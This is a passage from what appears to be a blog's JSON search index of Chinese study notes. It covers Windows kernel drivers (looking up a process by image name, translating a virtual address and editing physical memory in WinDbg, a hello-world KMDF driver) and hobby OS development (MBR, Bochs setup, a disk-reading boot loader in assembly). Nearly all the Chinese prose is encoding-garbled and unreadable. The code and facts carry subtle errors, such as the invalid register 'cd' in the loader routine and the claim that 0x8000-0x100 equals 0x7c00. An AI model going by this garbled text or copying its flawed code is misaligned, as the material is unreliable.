(TRUE);&#125;NTSTATUSLookUpProcessByImageName(PCWSTR ImageName, PEPROCESS* Process)&#123; NTSTATUS Status; PSYSTEM_PROCESS_INFORMATION ProcessInformationArray = NULL; Status = QuerySystemInformation(SystemProcessInformation, &amp;ProcessInformationArray); if (!NT_SUCCESS(Status)) return Status; PSYSTEM_PROCESS_INFORMATION CurrentInformation = ProcessInformationArray; UNICODE_STRING ImageNameUnicodeString; RtlInitUnicodeString(&amp;ImageNameUnicodeString, ImageName); while (TRUE) &#123; if (RtlCompareUnicodeString(&amp;CurrentInformation-&gt;ImageName, &amp;ImageNameUnicodeString, FALSE) == 0) &#123; Status = PsLookupProcessByProcessId(CurrentInformation-&gt;UniqueProcessId, Process); ExFreePool(ProcessInformationArray); return Status; &#125; if (CurrentInformation-&gt;NextEntryOffset == 0) &#123; ExFreePool(ProcessInformationArray); return STATUS_NOT_FOUND; &#125; CurrentInformation = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)CurrentInformation + CurrentInformation-&gt;NextEntryOffset); &#125;&#125; å¤§è‡´æ€è·¯å’Œwin32ä¸‹æŒ‰åç§°æŸ¥æ‰¾PIDå·®ä¸å¤š å…·ä½“è¿‡ç¨‹ è¿™é‡Œä»¥0x00000254000003BC Str1 ä¸ºä¾‹å­ï¼ŒåŠ è½½æ’ä»¶æ‰“å°ï¼Œè€å¿ƒç­‰å¾…ã€‚ã€‚ã€‚ è¿™æ—¶å€™çš„æ•°æ®å¤§å°å°±æœ‰83KBäº† format(0x00000254000003BC, &quot;064b&quot;)ï¼Œå†…å­˜å‰16ä½ä¸ºç©ºæ˜¯æ²¡æœ‰ç”¨çš„ é«˜9ä½ VPN1=4VPN1=4VPN1=4 int(format(0x00000254000003BC, &quot;064b&quot;)[16:][:9],2) å†9ä½ VPN2=336VPN2=336VPN2=336 int(format(0x00000254000003BC, &quot;064b&quot;)[16:][9:18],2) è¯¥é¡µè¡¨çš„PS=1ï¼Œåˆ™ä¸éœ€è¦æŸ¥æ‰¾ä¸‹ä¸€ä¸ªé¡µè¡¨äº†ï¼ˆè€Œä¸”åé¢ä¹Ÿæ²¡æœ‰äº†ï¼‰ å¾—åˆ°çš„Paå°±æ˜¯ç‰©ç†é¡µçš„é¦–åœ°å€ + å‰©ä½™çš„30bitä½ä½œä¸ºVPO = ç‰©ç†åœ°å€ hex(0x00000001C0000000+int(format(0x00000254000003BC, &quot;064b&quot;)[16:][18:],2)) å¾—åˆ°PA+VPO = 0x1c00003bc æš‚åœç³»ç»Ÿï¼ŒWindbg -&gt; memory window -&gt; å³é”® -&gt; proeries -&gt; physical memory å°è¯•ä¿®æ”¹ å†æ¬¡åˆ·æ–°åº”è¯¥å°±æ˜¯1234äº† æˆåŠŸä¿®æ”¹ å®˜æ–¹æ–‡æ¡£ 2938/4834","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windowså†…æ ¸é©±åŠ¨ 1-ç¯å¢ƒæ­å»º","slug":"windows_kernel_driver_1","date":"2023-02-16T04:07:43.000Z","updated":"2023-06-01T14:33:58.629Z","comments":true,"path":"2023/02/16/windows_kernel_driver_1/","link":"","permalink":"https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/","excerpt":"ç®€è€Œè¨€ä¹‹å°±æ˜¯ visual stdio 2019 windows SDK windows WDK å¦‚æœvsæ²¡æœ‰kernelçš„é¡¹ç›®çš„æ¨¡æ¿ï¼Œæ‰¾åˆ°vsç›®å½•çš„WDK.vsixå³å¯","text":"ç®€è€Œè¨€ä¹‹å°±æ˜¯ visual stdio 2019 windows SDK windows WDK å¦‚æœvsæ²¡æœ‰kernelçš„é¡¹ç›®çš„æ¨¡æ¿ï¼Œæ‰¾åˆ°vsç›®å½•çš„WDK.vsixå³å¯ å…³äºè°ƒè¯• windbgè°ƒè¯•å™¨ åŒæ—¶windows è™šæ‹Ÿæœºæˆ‘ä½¿ç”¨çš„æ˜¯ vmwareï¼Œæ·»åŠ äº†ä¸€ä¸ªCOMä¸²å£ åŠ è½½é©±åŠ¨ ä½¿ç”¨KmdKit windowsè®¾ç½® msconfig -&gt; è°ƒè¯• -&gt; COM2 â€¦ æœ€ç®€å•çš„hello world æ‰“å¼€vsï¼Œæ‰¾åˆ°KMDF ï¼ˆkernel mode driver emptyï¼‰ è®¾ç½®é©±åŠ¨é¡¹ç›® å–æ¶ˆæ™šä¸Š12ç‚¹åç¼–è¯‘æŠ¥é”™ é¡¹ç›® -&gt; å±æ€§ -&gt; Inf2Cat -&gt; Use Local Time ä»£ç  main.c 12345678910111213141516171819202122#include &lt;ntifs.h&gt;// é©±åŠ¨å¸è½½å‡½æ•°VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Bye\\n&quot;);&#125;// é©±åŠ¨å…¥å£å‡½æ•°// System åœ¨å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œè¯¥å‡½æ•°NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123; UNREFERENCED_PARAMETER(RegistryPath); //å®é˜²æ­¢ç¼–è¯‘å™¨æŠ¥é”™ DbgPrint(&quot;Hello World!\\n&quot;); //è°ƒå¼è¾“å‡º DriverObject-&gt;DriverUnload = DriverUnload; //é©±åŠ¨å¸è½½å‡½æ•° return STATUS_SUCCESS; //åŠ è½½æˆåŠŸè¿”å›ç &#125; Classæ”¹ä¸º Class=System ClassInstall32 ç›´æ¥åˆ é™¤ä¸¤è¡Œï¼ˆå°±æ˜¯ç›´æ¥æŠŠè¿™ä¸ªå±æ€§åˆ é™¤äº†ï¼‰ ä½¿ç”¨åŠ è½½å™¨åŠ è½½ ä½¿ç”¨KmdManager ä½¿ç”¨windbg x64è°ƒè¯• File -&gt; Kernel Debug F5ç»§ç»­è¿‡ååœ¨è™šæ‹Ÿæœºé‡Œé¢è¿è¡Œ","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"æ“ä½œç³»ç»Ÿå®ç°-åˆé›†1","slug":"os-allinone","date":"2022-08-24T12:00:00.000Z","updated":"2023-06-01T14:25:24.449Z","comments":true,"path":"2022/08/24/os-allinone/","link":"","permalink":"https://joe1sn.eu.org/2022/08/24/os-allinone/","excerpt":"ä»£ç æ¥æºï¼šhttps://github.com/StevenBaby/onix ç›¸å…³è¯¾ç¨‹ï¼šhttps://www.bilibili.com/video/BV1gR4y1u7or æ„Ÿè°¢Bç«™UPï¼šè¸Œèº‡æœˆå…‰ å¸¦æ¥çš„ç›¸å…³ä»£ç å’Œæ•™ç¨‹ åæ¥è§‰å¾—æ“ä½œç³»ç»Ÿä»0åˆ°1è¿™æ ·å­¦æ˜¯ä¸€ä¸ªéå¸¸è ¢å¾—æ¦‚å¿µï¼Œå› ä¸ºæ¯ä¸ªäººå­¦ä¹ ä»–åº”è¯¥æ˜¯æœ‰é‡ç‚¹åœ°ã€‚å¯¹ç³»ç»Ÿæœ‰ä¸ªåŸºç¡€çš„è®¤çŸ¥åï¼Œå°±è¯¥å»ç²¾é€šè‡ªå·±è¦ä¸“æ³¨çš„æ–¹å‘ï¼Œæ¯”å¦‚å†…å­˜ç®¡ç†ã€ç½‘ç»œåè®®ç­‰ ä¹Ÿæœ‰å¯èƒ½ä½ åªæ˜¯ä¸ºäº†é¢è¯•ï¼Œä½†æ˜¯é¢è¯•ä¹Ÿæ˜¯æœ‰é‡ç‚¹çš„å¯¹å§ æ‰€ä»¥æŠŠä¹‹å‰çš„æ–‡ç« åšä¸€ä¸ªåˆé›†ï¼Œå–œæ¬¢åœ¨è®¤è¯†ç³»ç»Ÿåå†åœ¨æ–¹é¢åˆ›é€ å­ç³»ç»Ÿ","text":"ä»£ç æ¥æºï¼šhttps://github.com/StevenBaby/onix ç›¸å…³è¯¾ç¨‹ï¼šhttps://www.bilibili.com/video/BV1gR4y1u7or æ„Ÿè°¢Bç«™UPï¼šè¸Œèº‡æœˆå…‰ å¸¦æ¥çš„ç›¸å…³ä»£ç å’Œæ•™ç¨‹ åæ¥è§‰å¾—æ“ä½œç³»ç»Ÿä»0åˆ°1è¿™æ ·å­¦æ˜¯ä¸€ä¸ªéå¸¸è ¢å¾—æ¦‚å¿µï¼Œå› ä¸ºæ¯ä¸ªäººå­¦ä¹ ä»–åº”è¯¥æ˜¯æœ‰é‡ç‚¹åœ°ã€‚å¯¹ç³»ç»Ÿæœ‰ä¸ªåŸºç¡€çš„è®¤çŸ¥åï¼Œå°±è¯¥å»ç²¾é€šè‡ªå·±è¦ä¸“æ³¨çš„æ–¹å‘ï¼Œæ¯”å¦‚å†…å­˜ç®¡ç†ã€ç½‘ç»œåè®®ç­‰ ä¹Ÿæœ‰å¯èƒ½ä½ åªæ˜¯ä¸ºäº†é¢è¯•ï¼Œä½†æ˜¯é¢è¯•ä¹Ÿæ˜¯æœ‰é‡ç‚¹çš„å¯¹å§ æ‰€ä»¥æŠŠä¹‹å‰çš„æ–‡ç« åšä¸€ä¸ªåˆé›†ï¼Œå–œæ¬¢åœ¨è®¤è¯†ç³»ç»Ÿåå†åœ¨æ–¹é¢åˆ›é€ å­ç³»ç»Ÿ [æ“ä½œç³»ç»Ÿå®ç°]åŸºç¡€ç¯‡ CPUä¸­çš„æ®µå¯„å­˜å™¨ CS (Code Segment Register)ï¼šä»£ç æ®µçš„æ®µåŸºå€ DS(Data Segment Register)ï¼šæ•°æ®æ®µçš„æ®µåŸºå€ ES(Extra Segment Register)ï¼šå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µåŸºå€¼ï¼Œç§°ä¸ºâ€œé™„åŠ â€æ˜¯å› ä¸ºæ­¤æ®µå¯„å­˜å™¨ç”¨é€”ä¸åƒå…¶ä»– sreg é‚£æ ·å›ºå®šï¼Œå¯ä»¥é¢å¤–åšä»–ç”¨ã€‚ FS(Extra Segment Register)ï¼šå…¶å€¼ä¸ºé™„åŠ æ•°æ®æ®µçš„æ®µåŸºå€¼ GSï¼šåŒä¸Š SS(Stack Segment Register)ï¼šå †æ ˆæ®µå¯„å­˜å™¨ åœ¨å®æ¨¡å¼ä¸­ï¼ŒCSã€DSã€ESã€SSä¸­çš„å€¼æ˜¯ç‰©ç†åœ°å€ åœ¨ä¿æŠ¤æ¨¡å¼ä¸­ï¼Œè£…å…¥å¯„å­˜å™¨çš„æ˜¯æ®µé€‰æ‹©å­ BIOS DOS Linuxä¸­æ–­çš„åŒºåˆ« BIOSã€DOSéƒ½æ˜¯åœ¨ å®æ¨¡å¼ ä¸­è¿è¡Œï¼Œæœ‰å†…éƒ¨ä¸­æ–­å‘é‡è¡¨(Interrupt Vector Table IVT)å»ºç«‹ï¼Œç”¨è¿‡INTæ‰ç”¨å®ç° BIOS ä¸­æ–­è°ƒç”¨çš„ä¸»è¦åŠŸèƒ½æ˜¯æä¾›äº†ç¡¬ä»¶è®¿é—®çš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä½¿å¯¹ç¡¬ä»¶çš„æ“ä½œå˜å¾—ç®€å•æ˜“è¡Œ BIOS åœ¨è¿è¡ŒæœŸé—´ä¼šæ‰«æ 0xc0000 0xe0000 ä¹‹é—´çš„å†…å­˜ï¼Œè‹¥åœ¨æŸä¸ªåŒºåŸŸå‘ç°å‰ä¸¤ä¸ª èŠ‚æ˜¯ Ox55 OxAA æ—¶ï¼Œè¿™æ„å‘³ç€è¯¥åŒºåŸŸå¯¹åº”çš„ rom ä¸­æœ‰ä»£ç å­˜åœ¨ï¼Œå†å¯¹è¯¥åŒºåŸŸåšç´¯åŠ å’Œæ£€æŸ¥ï¼Œè‹¥ç»“æœä¸ç¬¬3ä¸ªå­—èŠ‚çš„å€¼ç›¸ç¬¦ï¼Œè¯´æ˜ä»£ç æ— è¯¯ï¼Œå°±ä»ç¬¬4ä¸ªå­—èŠ‚è¿›å…¥ Linux å†…æ ¸æ˜¯åœ¨è¿›å…¥ä¿æŠ¤æ¨¡å¼åæ‰å»ºç«‹ä¸­æ–­ä¾‹ç¨‹çš„ï¼Œä¸è¿‡åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œä¸­æ–­å‘é‡è¡¨å·±ç»ä¸å­˜åœ¨äº†ï¼Œ å–è€Œä»£ä¹‹çš„æ˜¯ä¸­æ–­æè¿°ç¬¦è¡¨(Interrupt Descriptor Table, IDT)ã€‚ Linux æ˜¯é€šè¿‡ int 0x80 æŒ‡ä»¤è¿›å…¥ä¸€ä¸ªä¸­æ–­ç¨‹åºåå†æ ¹æ® ç¼¸å¯„å­˜å™¨çš„å€¼æ¥è°ƒç”¨ä¸åŒçš„å­åŠŸèƒ½å‡½æ•°çš„ Sectionä¸Segmentçš„åŒºåˆ« section ç§°ä¸ºèŠ‚ï¼Œæ˜¯æŒ‡åœ¨æ±‡ç¼–æºç ä¸­ç»ç”±å…³é”®å­— section segment ä¿®é¥°ã€é€»è¾‘åˆ’åˆ†çš„æŒ‡ä»¤æˆ–æ•°æ®åŒºåŸŸï¼Œ æ±‡ç¼–å™¨ä¼šå°†è¿™ä¸¤ä¸ªå…³é”®å­—ä¿®é¥°çš„åŒºåŸŸåœ¨ç›®æ ‡æ–‡ä»¶ä¸­ç¼–è¯‘æˆèŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´â€œèŠ‚â€æœ€åˆè¯ç”Ÿäºç›®æ ‡æ–‡ä»¶ä¸­ segment ç§°ä¸ºæ®µï¼Œæ˜¯é“¾æ¥å™¨æ ¹æ®ç›®æ ‡æ–‡ä»¶ä¸­å±æ€§ç›¸åŒçš„å¤šä¸ª section åˆå¹¶åçš„ section é›†åˆï¼Œè¿™ä¸ªé›†åˆ ç§°ä¸º segment ï¼Œä¹Ÿå°±æ˜¯æ®µï¼Œé“¾æ¥å™¨æŠŠç›®æ ‡æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå› æ­¤æ®µæœ€ç»ˆè¯ç”Ÿäºå¯æ‰§è¡Œæ–‡ä»¶ä¸­ ä¸ç®¡å®šä¹‰äº†å¤šå°‘èŠ‚åï¼Œæœ€ç»ˆè¦æŠŠå±æ€§ç›¸åŒçš„ section ï¼Œæˆ–è€…ç¼–è¯‘è®¤ä¸ºå¯ä»¥æ”¾åˆ°ä¸€å—çš„ï¼Œåˆå¹¶åˆ°ä¸€ä¸ªå¤§çš„ segment ä¸­ï¼Œä¹Ÿå°±æ˜¯ elf ä¸­è¯´çš„ program header ä¸­çš„é¡¹ MBR ã€EBRã€DBRã€OBRæ˜¯ä»€ä¹ˆ MBR æ˜¯ä¸»å¼•å¯¼è®°å½•(Main Boot Record)ï¼Œå­˜åœ¨ä¸ç£ç›˜å¼€å§‹ï¼Œæ‰‡åŒºå¤§å°ä¸º512å­—èŠ‚ 446 å­—èŠ‚çš„å¼•å¯¼ç¨‹åºåŠå‚æ•°ï¼š 64å­—èŠ‚åˆ†åŒºè¡¨ 2å­—èŠ‚ç»“æŸæ ‡è®°ï¼š\\x55\\xaa OBR å†…æ ¸åŠ è½½å™¨ï¼Œå­˜åœ¨äºæ“ä½œç³»ç»Ÿå¼•å¯¼æ‰‡åŒºï¼Œæ˜¯æ“ä½œç³»ç»Ÿå¼•å¯¼ç¨‹åº(OS Boot Record) DBR Dos Boot Record MBRè·³è½¬å¼•å¯¼æŒ‡ä»¤ å‚å•†ä¿¡æ¯ã€DOSç‰ˆæœ¬æ¨¡å— BIOSå‚æ•°å—BPB OBR ç»“æŸæ ‡è®° \\x55\\xaa EBR Extra Boot Recordï¼Œè§£å†³åˆ†åŒºæ•°é‡é™åˆ¶åŒæ—¶å…¼å®¹MBR MBR EBR æ˜¯åˆ†åŒºå·¥å…·åˆ›å»ºç»´æŠ¤çš„ï¼Œä¸å±äºæ“ä½œç³»ç»Ÿç®¡ç†çš„èŒƒå›´ grub multiboot 0x7c00 IBM PC 5150 DOS 1.0 [æ“ä½œç³»ç»Ÿå®ç°]MBR ä¸€äº›é—®é¢˜ BIOSå›ºå®šå…¥å£åœ°å€ï¼š0xFFFF0ï¼Œæ­¤æ—¶CPUä¸­çš„cs:ipä¸º 0xF000:0xFFF0ï¼ˆå®æ¨¡å¼ä¸‹csè¦å·¦ç§»4ä½å†ç›¸åŠ ï¼‰ ï¼Ÿä¸ºä»€ä¹ˆæ˜¯0x7C00 MBRç¨‹åºæ˜¯åœ¨å†…å­˜çš„0x7c00ä¸­è¿è¡Œçš„ï¼ŒDOS1.0ä¸­çš„æœ€å°å†…å­˜ä¸º32KBï¼Œæ‰€ä»¥é€‰æ‹©æœ€å1KBåˆç†ï¼Œ32KB=0x8000Bï¼Œ1KB=0x400ï¼Œæ‰€ä»¥ç¨‹åºå¼€å§‹æ˜¯0x8000-0x100=0x7c00 å¦‚ä½•æ‰¾åˆ°ç³»ç»Ÿè°ƒç”¨ç›¸å…³è¯´æ˜ IBM PS 2 and PC BIOS Interface Technical Reference ä¸»å¼•å¯¼æ‰‡åŒºç»“æ„ ä»£ç å¤§å°ï¼š446B ç¡¬ç›˜åˆ†åŒºè¡¨ï¼š64B=4*16B magic_numï¼š0xaa55 - 0x55 0xaa ä¸»è¦åŠŸèƒ½ â€‹ è¯»å–å†…æ ¸åŠ è½½å…¶å¹¶æ‰§è¡Œ å®éªŒ æŒ‰ç…§ä¹¦ä¸Šé…ç½®å¥½ç¯å¢ƒ é…ç½®æ–‡ä»¶ 123456789101112131415161718192021222324252627#Bochsè¿è¡Œä¸­ä½¿ç”¨çš„å†…å­˜ï¼Œè®¾ç½®ä¸º32Mmegs: 32#è®¾ç½®çœŸå®æœºå™¨çš„BIOSå’ŒVGA BIOS#ä¿®æ”¹æˆä½ ä»¬å¯¹åº”çš„åœ°å€romimage: file=/home/joe1sn/Desktop/real_os/bochs/share/bochs/BIOS-bochs-latestvgaromimage: file=/home/joe1sn/Desktop/real_os/bochs/share/bochs/VGABIOS-lgpl-latest#è®¾ç½®Bochsæ‰€ä½¿ç”¨çš„ç£ç›˜#è®¾ç½®å¯åŠ¨ç›˜ç¬¦boot: disk#è®¾ç½®æ—¥å¿—æ–‡ä»¶çš„è¾“å‡ºlog: bochs.out#å¼€å¯æˆ–å…³é—­æŸäº›åŠŸèƒ½ï¼Œä¿®æ”¹æˆä½ ä»¬å¯¹åº”çš„åœ°å€mouse: enabled=0keyboard:keymap=/home/joe1sn/Desktop/real_os/bochs/share/bochs/keymaps/x11-pc-us.map#ç¡¬ç›˜è®¾ç½®ata0: enabled=1, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14ata0-master: type=disk, path=&quot;hd60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63#ata0-master: type=disk, path=&quot;gp60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63#å¢åŠ bochså¯¹gdbçš„æ”¯æŒï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œä¸ä½¿ç”¨ï¼Œæ‰€ä»¥æ³¨é‡Šæ‰äº†#gdbstub: enabled=1, port=1234, text_base=0, data_base=0, bss_base=0 æºä»£ç  12345678910111213141516171819202122232425262728293031323334353637;MBR;--------------------------------SECTION MBR vstart=0x7c00; mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00;ä½¿ç”¨6ä¸Šå·å±å¹•ï¼Œå®ç°æ¸…å±;------------------------------------------------------- mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;;;;; å¾—åˆ°å…‰æ ‡ä½ç½® mov ah, 3 ;3å·åŠŸèƒ½æ˜¯è·å–å…‰æ ‡ä½ç½® mov bh, 0 ;å­˜å‚¨å¸¦è·å–å…‰æ ‡çš„é¡µå· int 0x10;;;;; æ‰“å°å­—ç¬¦ä¸² mov ax, message mov bp, ax mov cx, 5 mov ax, 0x1301 mov bx, 0x2 int 0x10 jmp $ ;pause message db &quot;MetOS&quot;;è¦æ‰“å°çš„å­—ç¬¦ä¸² times 510-($-$$) db 0 db 0x55,0xaa ç¼–è¯‘ 1nasm -o mbr.bin mbr.asm è®¾ç½®åŸºç¡€BOCHSç¡¬ç›˜ 1./bin/bximage -hd -mode=&quot;flat&quot; -size=60 -q hd60M.img ata0-master: type=disk, path=â€œmaster.imgâ€, mode=flat, cylinders=121, heads=16, spt=63 æŒ‰ç…§æ ¼å¼å†™å…¥ç¡¬ç›˜æ–‡ä»¶ 1dd if=./mbr.bin of=/home/joe1sn/Desktop/real_os/bochs/hd60M.img bs=512 count=1 conv=notrunc ä½¿ç”¨æ˜¾å¡æ˜¾ç¤º IA32 ä½“ç³»ç³»ç»Ÿä¸­ï¼Œå› ä¸ºç”¨äºå­˜å‚¨ç«¯å£å·çš„å¯„å­˜å™¨æ˜¯ 16 ä½çš„ï¼Œæ‰€ä»¥æœ€å¤§æœ‰ 65536 ä¸ªç«¯å£ï¼Œå³ 65535 è¦æ˜¯é€šè¿‡å†…å­˜æ˜ å°„ï¼Œç«¯å£å°±å¯ä»¥ç”¨ mov æŒ‡ä»¤æ¥æ“ä½œã€‚ä½†ç”±äºç”¨çš„æ˜¯ç‹¬ç«‹ç¼–å€ï¼Œæ‰€ä»¥å°±ä¸èƒ½æŠŠå®ƒå½“ä½œå†…å­˜æ¥æ“ä½œï¼Œå› æ­¤ CPU æä¾›äº†ä¸“é—¨çš„æŒ‡ä»¤æ¥å¹²è¿™äº‹ï¼Œinå’Œout inç”¨äºè¯»æ•°æ® outç”¨äºå†™æ•°æ® å¤–éƒ¨è®¾å¤‡BIOSæ˜¯ï¼š0xC000é“0xCFFF æ˜¾å­˜æ˜¯0xB8000åˆ°0xBFFFF æºä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445;Main Bootloader Program;--------------------------------SECTION MBR vstart=0x7c00 mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00 mov ax,0xb800 mov gs,ax;clear screen using int_6;-----------------------------------------------------------;INT 0x10 function_code:6 funcion:uproll the screen;-----------------------------------------------------------;INPUT mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;using gpu mov byte [gs:0x00],&#x27;M&#x27; mov byte [gs:0x01],0x04 ;green back_flash mov byte [gs:0x02],&#x27;e&#x27; mov byte [gs:0x03],0x04 mov byte [gs:0x04],&#x27;l&#x27; mov byte [gs:0x05],0x04 mov byte [gs:0x06],&#x27;t&#x27; mov byte [gs:0x07],0x04 mov byte [gs:0x08],&#x27;O&#x27; mov byte [gs:0x09],0x04 mov byte [gs:0x0a],&#x27;S&#x27; mov byte [gs:0x0b],0x04 jmp $ ;pause times 510-($-$$) db 0 db 0x55,0xaa BOCHSè°ƒè¯• Debug Control q|quit|exit set show show mode æ¯æ¬¡CPUå˜æ¢æ¨¡å¼æé†’ show int æ¯æ¬¡ä¸­æ–­æ—¶æé†’ show call å‡½æ•°è°ƒç”¨æ—¶æé†’ u|disasm [/num] [start] [end] â€‹ åæ±‡ç¼– startåˆ°endä»£ç ï¼Œnumæ˜¯åæ±‡ç¼–æŒ‡ä»¤æ•° Execution control c| cont| continue s| step [count] p| n| next Breakpoint management vb| vbreak æŒ‰ç…§è™šæ‹Ÿåœ°å€ä¸‹æ–­ç‚¹ lb| break[addr]çº¿æ€§åœ°å€æ·»åŠ æ–­ç‚¹ pb| pbreak| b| break [addr] ç‰©ç†åœ°å€æ·»åŠ æ–­ç‚¹ sb [delta] delta è¡¨ç¤ºå†æ‰§è¡Œdeltaæ¡æŒ‡ä»¤ç¨‹åºå°±ä¸­æ–­ watch unwatch blist æ˜¾ç¤ºæ‰€æœ‰æ–­ç‚¹ä¿¡æ¯ bpd| bpe [n]ç¦ç”¨æ–­ç‚¹ d| del| delete[n] åˆ é™¤æŸæ–­ç‚¹ MBRä½¿ç”¨ç¡¬ç›˜-äº¤å‡ºæ§åˆ¶æƒ MBR 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117;Main Bootloader Program;--------------------------------%include &quot;boot.inc&quot;SECTION MBR vstart=0x7c00 mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00 mov ax,0xb800 mov gs,ax;clear screen using int_6;-----------------------------------------------------------;INT 0x10 function_code:6 funcion:uproll the screen;-----------------------------------------------------------;INPUT mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;using gpu mov byte [gs:0x00],&#x27;M&#x27; mov byte [gs:0x01],0x04 ;green back_flash mov byte [gs:0x02],&#x27;e&#x27; mov byte [gs:0x03],0x04 mov byte [gs:0x04],&#x27;l&#x27; mov byte [gs:0x05],0x04 mov byte [gs:0x06],&#x27;t&#x27; mov byte [gs:0x07],0x04 mov byte [gs:0x08],&#x27;O&#x27; mov byte [gs:0x09],0x04 mov byte [gs:0x0a],&#x27;S&#x27; mov byte [gs:0x0b],0x04 mov eax,LOADER_START_SECTOR ;èµ·å§‹æ‰‡åŒºlbaåœ°å€ mov bx,LOADER_BASE_ADDR ;å†™å…¥ç£ç›˜çš„åœ°å€ mov cd,1 ;ä»£è¯»å…¥çš„æ‰‡åŒºæ•° call rd_disk_m_16 jmp LOADER_BASE_ADDR;è¯»å–ç¡¬ç›˜çš„ç¬¬nä¸ªæ‰‡åŒºrd_disk_m_16:; eax=LBAæ‰‡åŒºå·; ebx=å°†æ•°æ®å†™å…¥çš„å†…å­˜åœ°å€; ecx=è¯»å…¥çš„æ‰‡åŒºæ•° mov esi,eax ;å¤‡ä»½eax mov di,cx ;å¤‡ä»½cx;è¯»å†™ç¡¬ç›˜;------S1:è®¾ç½®è¦è¯»å–æ‰‡åŒºæ•° mov dx,0x1f2 mov al,cl out dx,al ;ä»£è¯»å–çš„æ‰‡åŒºæ•° mov eax,esi ;æ¢å¤ax;------S2:å°†LBAåœ°å€å†™å…¥0x1f3-0x1f6 ;LBA åœ°å€7-0ä½å†™å…¥ç«¯å£ 0x1f3 mov dx,0x1f3 out dx,al ;LBA åœ°å€15-8 ä½å†™å…¥ç«¯å£ 0x1f4 mov cl,8 shr eax,cl mov dx,0x1f4 out dx,al ;LBA åœ°å€23-16 ä½å†™å…¥ç«¯å£ 0x1f5 shr eax,cl mov dx,0x1f5 out dx,al shr eax,cl and al,0x0f ;LBA 24-27 bits or al,0xe0 ;set 7-4 = 1110ï¼Œè¡¨ç¤ºLBAæ¨¡å¼ mov dx,0x1f6 out dx,al;------S3:0x1f7ç«¯å£å†™å…¥è¯»å‘½ä»¤,0x20 mov dx,0x1f7 mov al,0x20 out dx,al;------S4:æ£€æµ‹ç¡¬ç›˜çŠ¶æ€ .not_ready: nop in al,dx and al,0x88 ;ç¬¬4ä½ä¸º1è¡¨ç¤ºç¡¬ç›˜æ§åˆ¶å™¨å·²å‡†å¤‡å¥½æ•°æ®ä¼ è¾“ï¼Œç¬¬7ä½ä¸º1è¡¨ç¤ºç¡¬ç›˜å¿™ cmp al,0x08 jnz .not_ready;------S5:ä»0x1f0è¯»å–æ•°æ® mov ax,di mov dx,256 mul dx mov cx,ax mov dx,0x1f0 .go_on_ready: in ax,dx mov [bx],ax add bx,2 loop .go_on_ready ret ;jmp $ ;pause times 510-($-$$) db 0 db 0x55,0xaa å®LOADER_START_SECTORå°±æ˜¯0x2ï¼Œè¡¨ç¤ºæˆ‘ä»¬è¦å‘ç£ç›˜ç¬¬ä¸‰ä¸ªæ‰‡åŒºï¼ˆç¬¬ä¸€ä¸ªæ˜¯0x0ï¼‰è¯»loaderï¼ŒLOADER_BASE_ADDRå°±æ˜¯loaderè¢«å†™å…¥çš„åœ°å€0x900ã€‚ Loader 12345678910111213141516171819202122232425262728%include &quot;boot.inc&quot;section loader vstart=LOADER_BASE_ADDRmov byte [gs:0x00] ,&#x27;2&#x27;mov byte [gs:0x01] ,0xA4mov byte [gs:0x02] ,&#x27; &#x27;mov byte [gs:0x03] ,0xA4mov byte [gs:0x04] ,&#x27;L&#x27;mov byte [gs:0x05] ,0xA4mov byte [gs:0x06] ,&#x27;o&#x27;mov byte [gs:0x07] ,0xA4mov byte [gs:0x08] ,&#x27;a&#x27;mov byte [gs:0x09] ,0xA4mov byte [gs:0x0a] ,&#x27;d&#x27;mov byte [gs:0x0b] ,0xA4mov byte [gs:0x0c] ,&#x27;e&#x27;mov byte [gs:0x0d] ,0xA4mov byte [gs:0x0e] ,&#x27;r&#x27;mov byte [gs:0x0f] ,0xA4jmp $ ç¼–è¯‘åå†™å…¥ç¬¬äºŒæ‰‡åŒº 1dd if=./MBR/loader.bin of=/home/joe1sn/Desktop/real_os/bochs/disk60M.img bs=512 count=1 seek=2 conv=notrunc æ€»ç»“ **1.MBRæ‰§è¡Œæµç¨‹ ** ä»å†…å­˜æœ€ä½1KBä½ç½®å‡ºå‘ï¼Œè°ƒç”¨BIOSçš„ä¸­æ–­å‘é‡è¡¨å®ç° 2.ä½¿ç”¨å¤–éƒ¨IOè®¾å¤‡ 